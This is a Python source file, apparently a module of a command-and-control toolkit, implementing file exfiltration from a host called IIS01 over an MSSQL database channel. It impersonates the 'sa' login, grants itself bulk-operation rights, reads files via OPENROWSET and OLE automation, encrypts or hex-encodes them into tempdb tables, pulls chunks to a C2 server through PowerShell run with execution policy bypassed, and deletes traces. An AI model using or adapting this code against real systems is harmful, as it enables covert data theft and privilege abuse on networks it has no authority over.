import base64
import math
import os
import time

# controlShell/xp_mssql/ -> ../../controlServer/files/
_UPLOAD_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                           "..", "..", "controlServer", "files")


class ExfilMixin:
    """Exfil files from IIS01 via MSSQL DB channel (AES-256-CBC or hex)."""

    def _get_remote_file_size(self, shell, remote_path: str) -> int | None:
        size_out = self._exec_q(shell,
            "EXECUTE AS LOGIN='sa';"
            "DECLARE @fso INT,@f INT,@sz BIGINT;"
            "EXEC sp_OACreate 'Scripting.FileSystemObject',@fso OUT;"
            f"EXEC sp_OAMethod @fso,'GetFile',@f OUT,'{self._tsql_escape(remote_path)}';"
            "EXEC sp_OAGetProperty @f,'Size',@sz OUT;"
            "SELECT @sz AS file_size;"
            "EXEC sp_OADestroy @fso;"
        )
        for line in (size_out or "").splitlines():
            s = line.strip()
            if s.isdigit():
                return int(s)
        return None

    def cmd_xpexfil(self, shell, remote_path: str, local_name: str,
                    insert_timeout_s: int = 600, chunk_mb: int = 10):
        """Exfil a file from IIS01 to controlServer via MSSQL DB channel (AES-256-CBC, chunked)."""
        key_b64     = base64.b64encode(os.urandom(32)).decode()
        chunk_bytes = chunk_mb * 1024 * 1024
        upload_dir  = _UPLOAD_DIR

        # A — get file size
        print("[*] xpexfil: getting file size ...")
        file_size = self._get_remote_file_size(shell, remote_path)
        if file_size is None:
            print("[!] xpexfil: could not read file size")
            return

        num_chunks = math.ceil(file_size / chunk_bytes)
        print(f"[*] xpexfil: {file_size} bytes, {num_chunks} chunk(s) of {chunk_mb} MB each")

        for i in range(num_chunks):
            offset = i * chunk_bytes
            length = min(chunk_bytes, file_size - offset)
            chunk_local = f"C:\\Windows\\Temp\\{local_name}.chunk{i}"

            # B — INSERT chunk
            print(f"[*] xpexfil: chunk {i+1}/{num_chunks} — INSERT (offset={offset}, len={length}) ...")
            self.cmd_xpshell_psh(shell,
                self._build_exfil_insert_ps(remote_path, key_b64, offset, length),
                timeout_s=insert_timeout_s)

            # C — confirm INSERT complete
            print(f"[*] xpexfil: chunk {i+1}/{num_chunks} — confirming INSERT complete ...")
            deadline = time.time() + insert_timeout_s
            while time.time() < deadline:
                result = self._exec_q(shell,
                    "EXECUTE AS LOGIN='sa';"
                    "SELECT CASE WHEN OBJECT_ID('tempdb..exfil','U') IS NOT NULL "
                    "THEN 'exists' ELSE 'notfound' END"
                )
                if result and 'exists' in result:
                    break
                print("[*] xpexfil: INSERT still running, retrying in 15s ...")
                time.sleep(15)
            else:
                print(f"[!] xpexfil: timed out waiting for chunk {i} INSERT — aborting")
                return

            # D — extract chunk to WS01, pull to C2, delete from WS01
            print(f"[*] xpexfil: chunk {i+1}/{num_chunks} — extracting to WS01 ...")
            extract_ps = self._build_exfil_extract_ps(chunk_local, key_b64)
            shell.cmd_exec_raw(f'powershell -NoProfile -ExecutionPolicy Bypass -Command "{extract_ps}"')

            print(f"[*] xpexfil: chunk {i+1}/{num_chunks} — pulling to C2 ...")
            shell.cmd_get_wait(chunk_local, dest_name=f"{local_name}.chunk{i}")
            shell.cmd_exec_raw(f"cmd /c del /f {chunk_local}")

            # E — drop table for next chunk
            self._exec_q(shell,
                "EXECUTE AS LOGIN='sa';"
                "IF OBJECT_ID('tempdb..exfil','U') IS NOT NULL DROP TABLE tempdb..exfil;"
            )

        # F — assemble chunks on C2
        print(f"[*] xpexfil: assembling {num_chunks} chunk(s) on C2 ...")
        out_path = os.path.join(upload_dir, local_name)
        with open(out_path, 'wb') as out_f:
            for i in range(num_chunks):
                cp = os.path.join(upload_dir, f"{local_name}.chunk{i}")
                with open(cp, 'rb') as cf:
                    while True:
                        buf = cf.read(1 << 20)
                        if not buf:
                            break
                        out_f.write(buf)
                os.remove(cp)
        print(f"[+] xpexfil done: {out_path}")

    def _build_exfil_insert_ps(self, remote_path: str, key_b64: str,
                               offset: int = 0, length: int = None) -> str:
        """PowerShell run on IIS01: AES-encrypt file chunk + INSERT into tempdb..exfil."""
        connstr = (f"Server={self._host.replace(':', ',')};"
                   f"Database=tempdb;User ID={self._login};Password={self._password};"
                   f"TrustServerCertificate=True")
        if length is None:
            read_block = f"$raw=[IO.File]::ReadAllBytes('{remote_path}');"
        else:
            read_block = (
                f"$fs=[IO.File]::OpenRead('{remote_path}');"
                f"$fs.Seek({offset},[IO.SeekOrigin]::Begin)|Out-Null;"
                f"$buf=New-Object byte[] {length};"
                "$n=$fs.Read($buf,0,$buf.Length);"
                "$raw=New-Object byte[] $n;"
                "[Array]::Copy($buf,0,$raw,0,$n);"
                "$fs.Close();"
            )
        return (
            read_block
            + f"$kb=[System.Text.Encoding]::ASCII.GetBytes('{key_b64}');"
            "$kt=New-Object System.Security.Cryptography.FromBase64Transform;"
            "$kms=New-Object System.IO.MemoryStream;"
            "$kcs=New-Object System.Security.Cryptography.CryptoStream($kms,$kt,[System.Security.Cryptography.CryptoStreamMode]::Write);"
            "$kcs.Write($kb,0,$kb.Length);$kcs.FlushFinalBlock();$k=$kms.ToArray();"
            "$a=[System.Security.Cryptography.Aes]::Create();"
            "$a.Mode='CBC';$a.Padding='PKCS7';$a.Key=$k;$a.GenerateIV();"
            "$enc=$a.CreateEncryptor().TransformFinalBlock($raw,0,$raw.Length);"
            "$blob=[byte[]]($a.IV)+$enc;"
            "$t2=New-Object System.Security.Cryptography.ToBase64Transform;"
            "$ms2=New-Object System.IO.MemoryStream;"
            "$cs2=New-Object System.Security.Cryptography.CryptoStream($ms2,$t2,[System.Security.Cryptography.CryptoStreamMode]::Write);"
            "$cs2.Write($blob,0,$blob.Length);$cs2.FlushFinalBlock();"
            "$b64=[System.Text.Encoding]::ASCII.GetString($ms2.ToArray());"
            f"$cn=New-Object System.Data.SqlClient.SqlConnection('{connstr}');"
            "$cn.Open();$cm=$cn.CreateCommand();"
            "$cm.CommandText=\"EXECUTE AS LOGIN='sa';"
            "IF OBJECT_ID('tempdb..exfil','U') IS NOT NULL DROP TABLE tempdb..exfil;"
            "CREATE TABLE tempdb..exfil(id INT IDENTITY(1,1),chunk NVARCHAR(MAX));GRANT SELECT ON exfil TO PUBLIC;\";"
            "$cm.ExecuteNonQuery()|Out-Null;"
            "$cs=8000;$n=[Math]::Ceiling($b64.Length/$cs);"
            "for($i=0;$i -lt $n;$i++){"
            "$chunk=$b64.Substring($i*$cs,[Math]::Min($cs,$b64.Length-$i*$cs));"
            "$esc=$chunk.Replace(\"'\",\"''\");"
            "$cm2=$cn.CreateCommand();"
            "$cm2.CommandText=\"INSERT INTO tempdb..exfil(chunk) VALUES (N'$esc')\";"
            "$cm2.ExecuteNonQuery()|Out-Null"
            "};"
            "$cn.Close();"
            "Write-Output 'exfil INSERT done'"
        )

    def _build_exfil_extract_ps(self, local_path: str, key_b64: str) -> str:
        """PowerShell run on WS01: read tempdb..exfil, decode, decrypt, write file."""
        connstr = (f"Server={self._host.replace(':', ',')};"
                   f"Database=tempdb;User ID={self._login};Password={self._password};"
                   f"TrustServerCertificate=True")
        return (
            f"$cn=New-Object System.Data.SqlClient.SqlConnection('{connstr}');"
            "$cn.Open();$cm=$cn.CreateCommand();"
            "$cm.CommandText='SELECT chunk FROM tempdb..exfil ORDER BY id';"
            "$rd=$cm.ExecuteReader();$sb=New-Object System.Text.StringBuilder;"
            "while($rd.Read()){$sb.Append($rd.GetString(0))|Out-Null};"
            "$rd.Close();$cn.Close();"
            "$raw=[System.Text.Encoding]::ASCII.GetBytes($sb.ToString());"
            "$t=New-Object System.Security.Cryptography.FromBase64Transform;"
            "$ms=New-Object System.IO.MemoryStream;"
            "$cs=New-Object System.Security.Cryptography.CryptoStream($ms,$t,[System.Security.Cryptography.CryptoStreamMode]::Write);"
            "$cs.Write($raw,0,$raw.Length);$cs.FlushFinalBlock();"
            "$blob=$ms.ToArray();"
            f"$kb=[System.Text.Encoding]::ASCII.GetBytes('{key_b64}');"
            "$kt=New-Object System.Security.Cryptography.FromBase64Transform;"
            "$kms=New-Object System.IO.MemoryStream;"
            "$kcs=New-Object System.Security.Cryptography.CryptoStream($kms,$kt,[System.Security.Cryptography.CryptoStreamMode]::Write);"
            "$kcs.Write($kb,0,$kb.Length);$kcs.FlushFinalBlock();$k=$kms.ToArray();"
            "$a=[System.Security.Cryptography.Aes]::Create();"
            "$a.Mode='CBC';$a.Padding='PKCS7';$a.Key=$k;$a.IV=$blob[0..15];"
            "$ct=$blob[16..($blob.Length-1)];"
            "$dec=$a.CreateDecryptor().TransformFinalBlock($ct,0,$ct.Length);"
            f"[IO.File]::WriteAllBytes('{local_path}',$dec)"
        )

    # ── hex exfil (P3) ─────────────────────────────────────────────────────

    def _build_exfil_insert_tsql(self, remote_path: str, chunk_mb: int) -> str:
        """T-SQL batch: OPENROWSET(BULK) read + chunk + hex encode + INSERT all."""
        chunk_bytes = chunk_mb * 1048576
        return (
            "EXECUTE AS LOGIN='sa';"
            "DECLARE @data VARBINARY(MAX);"
            f"SELECT @data=BulkColumn FROM OPENROWSET(BULK "
            f"'{self._tsql_escape(remote_path)}',SINGLE_BLOB) AS t;"
            "DECLARE @total INT=DATALENGTH(@data);"
            "IF OBJECT_ID('tempdb..exfil','U') IS NOT NULL DROP TABLE tempdb..exfil;"
            "CREATE TABLE tempdb..exfil("
            "id INT IDENTITY(1,1),chunk_idx INT NOT NULL,"
            "chunk NVARCHAR(MAX) NOT NULL);"
            "EXEC tempdb.dbo.sp_executesql N'GRANT SELECT ON dbo.exfil TO PUBLIC';"
            f"DECLARE @cb INT={chunk_bytes};"
            "DECLARE @i INT=0;"
            "WHILE @i*@cb<@total "
            "BEGIN "
            "DECLARE @off INT=@i*@cb+1;"
            "DECLARE @len INT=CASE WHEN @off+@cb-1>@total "
            "THEN @total-@off+1 ELSE @cb END;"
            "DECLARE @hex VARCHAR(MAX)=CONVERT(VARCHAR(MAX),"
            "SUBSTRING(@data,@off,@len),2);"
            "DECLARE @j INT=1;"
            "WHILE @j<=LEN(@hex) "
            "BEGIN "
            "INSERT INTO tempdb..exfil(chunk_idx,chunk) "
            "VALUES(@i,SUBSTRING(@hex,@j,8000));"
            "SET @j=@j+8000;"
            "END;"
            "SET @i=@i+1;"
            "END;"
            "SELECT @i AS num_chunks,@total AS file_bytes,"
            "(SELECT COUNT(*) FROM tempdb..exfil) AS total_rows;"
        )

    def _build_exfil_extract_hex_ps(self, local_path: str, chunk_idx: int) -> str:
        """PowerShell run on WS01: read hex chunks for one file-chunk, write raw hex text."""
        connstr = (f"Server={self._host.replace(':', ',')};Database=tempdb;"
                   f"User ID={self._login};Password={self._password};"
                   f"TrustServerCertificate=True")
        return (
            f"$cn=New-Object System.Data.SqlClient.SqlConnection('{connstr}');"
            "$cn.Open();$cm=$cn.CreateCommand();"
            f"$cm.CommandText='SELECT chunk FROM tempdb..exfil "
            f"WHERE chunk_idx={chunk_idx} ORDER BY id';"
            "$rd=$cm.ExecuteReader();"
            "$sb=New-Object System.Text.StringBuilder;"
            "while($rd.Read()){$sb.Append($rd.GetString(0))|Out-Null};"
            "$rd.Close();$cn.Close();"
            f"[IO.File]::WriteAllText('{local_path}',$sb.ToString())"
        )

    def _assemble_hex_chunks(self, local_name: str, num_chunks: int):
        """Decode hex text chunks to binary and assemble on C2."""
        out_path = os.path.join(_UPLOAD_DIR, local_name)
        with open(out_path, 'wb') as out_f:
            for i in range(num_chunks):
                hex_path = os.path.join(_UPLOAD_DIR, f"{local_name}.hex{i}")
                with open(hex_path, 'r') as hf:
                    hex_text = hf.read()
                out_f.write(bytes.fromhex(hex_text))
                os.remove(hex_path)
        print(f"[+] xpexfil-hex done: {out_path}")

    def cmd_xpexfil_hex(self, shell, remote_path: str, local_name: str,
                        insert_timeout_s: int = 600, chunk_mb: int = 10):
        """Exfil file from IIS01 via OPENROWSET(BULK) + hex INSERT; C2 Python decode."""
        # A \u2014 get file size
        print("[*] xpexfil-hex: getting file size ...")
        file_size = self._get_remote_file_size(shell, remote_path)
        if file_size is None:
            print("[!] xpexfil-hex: could not read file size")
            return
        num_chunks = math.ceil(file_size / (chunk_mb * 1024 * 1024))
        print(f"[*] xpexfil-hex: {file_size} bytes, {num_chunks} chunk(s)")

        # B \u2014 grant BULK OPERATIONS (OPENROWSET ignores EXECUTE AS impersonation)
        self._exec_q(shell,
            "EXECUTE AS LOGIN='sa';"
            f"GRANT ADMINISTER BULK OPERATIONS TO [{self._tsql_escape(self._login)}];")

        # C \u2014 ONE T-SQL batch: OPENROWSET(BULK) + chunk + hex + INSERT all
        insert_tsql = self._build_exfil_insert_tsql(remote_path, chunk_mb)
        print(f"[*] xpexfil-hex: T-SQL INSERT all {num_chunks} chunk(s) ...")
        result = self._exec_q(shell, insert_tsql, timeout_s=insert_timeout_s)
        if result and 'Msg' in result and 'Level' in result:
            print(f"[!] xpexfil-hex: T-SQL INSERT failed:\n{result}")
            return

        # D \u2014 per file-chunk: extract hex text + upload to C2
        for i in range(num_chunks):
            chunk_local = f"C:\\Windows\\Temp\\{local_name}.hex{i}"
            extract_ps = self._build_exfil_extract_hex_ps(chunk_local, chunk_idx=i)
            print(f"[*] xpexfil-hex: chunk {i+1}/{num_chunks} \u2014 extract + pull ...")
            shell.cmd_exec_raw(
                f'powershell -NoProfile -ExecutionPolicy Bypass '
                f'-Command "{extract_ps}"')
            shell.cmd_get_wait(chunk_local, dest_name=f"{local_name}.hex{i}")
            shell.cmd_exec_raw(f"cmd /c del /f {chunk_local}")

        # E \u2014 cleanup exfil table
        self._exec_q(shell, "EXECUTE AS LOGIN='sa';"
            "IF OBJECT_ID('tempdb..exfil','U') IS NOT NULL "
            "DROP TABLE tempdb..exfil;")

        # F \u2014 C2-side: hex decode + assemble binary
        print(f"[*] xpexfil-hex: assembling {num_chunks} chunk(s) on C2 ...")
        self._assemble_hex_chunks(local_name, num_chunks)
